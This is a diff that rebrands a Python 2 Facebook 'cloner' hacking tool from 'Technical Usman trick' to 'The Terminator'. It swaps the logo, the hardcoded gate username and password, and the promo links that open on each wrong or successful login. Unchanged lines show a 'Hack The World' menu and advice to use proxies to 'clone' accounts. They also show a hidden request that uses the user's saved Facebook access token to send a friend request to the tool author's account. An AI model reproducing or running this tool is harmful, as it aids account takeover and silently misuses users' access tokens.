@@ -48,14 +48,14 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[1;94m           ▄▀▀ █▀▀ █░█ 🖕🏻New Update🖕🏻
-\033[1;96m.          ░▀▄ █▀▀ ▄▀▄
-\033[1;98m           ▀▀░ ▀▀▀ ▀░▀
+\033[1;94m               ✪THE TERMINATOR✪🖕🏻New Update🖕🏻
+\033[1;96m.         
+\033[1;98m           
 \033[1;94m🔥╭╬──────────────────────────────────╬╮🔥
-\033[0;96m  ⚡ ✯ create ✪ Technical Usman trick  ✬⚡
-\033[0;97m  ⚡ ✯ YouTube ✪ Technical Usman trick ✬⚡
-\033[0;99m  ⚡ ✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ✬⚡
-\034[0;94m  ⚡  ❥WhatsApp  Num Nahi mila ga Instagram ka link discreption mae hai waha a jao ツ
+\033[0;96m  ⚡ ✯ create ✪ The Terminator Team  ✬⚡
+\033[0;97m  ⚡ ✯ YouTube ✪ Tricks Squad✬⚡
+\033[0;99m  ⚡ ✯ Its Terminator Power ✬⚡
+\034[0;94m  ⚡ ✯ We start From the end ✯
 \033[1;97m🔥╰╬──────────────────────────────────╬╯🔥 """
                                                 
 def tik():
@@ -88,11 +88,11 @@ jalan("\033[1;94m((    ||    ((   )) ||\\|| ||== ")
 jalan("\033[1;95m \\__ ||__|  \\_//  || \|| ||___ ") 
 jalan("\033[1;97m INDIAN USER USE ANY PROXY TO CLONE")
 jalan("\033[1;96m WIFI USER USE ANY PROXY TO CLONE")
-jalan("\033[1;99m Welcome to Technical Usman trick")
+jalan("\033[1;99m Welcome to terminator")
 jalan("\033[1;96m•◈•──────────•◈•\033[1;93mtechnicalusmantrick\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "Cloner"
-CorrectPassword = "technicalUsmantrick"
+CorrectUsername = "tt"
+CorrectPassword = "theterminator"
 
 loop = 'true'
 while (loop == 'true'):
@@ -105,10 +105,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
+            os.system('xdg-open https://www.facebook.com/S4ADIL')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
+        os.system('xdg-open https://www.facebook.com/S4ADIL')
 
 def login():
 	os.system('clear')
@@ -149,7 +149,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
+				os.system('xdg-open https://www.facebook.com/S4ADIL')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -202,7 +202,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;36;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;41mHack The World"	
-	print "\033[1;32;40m[2] \033[1;33;42mUpdate Technical Usman trick"																														
+	print "\033[1;32;40m[2] \033[1;33;42mUpdate The Terminator "																														
 	print "\033[1;32;40m[0] \033[1;33;43mLog out"
 	pilih()
 	
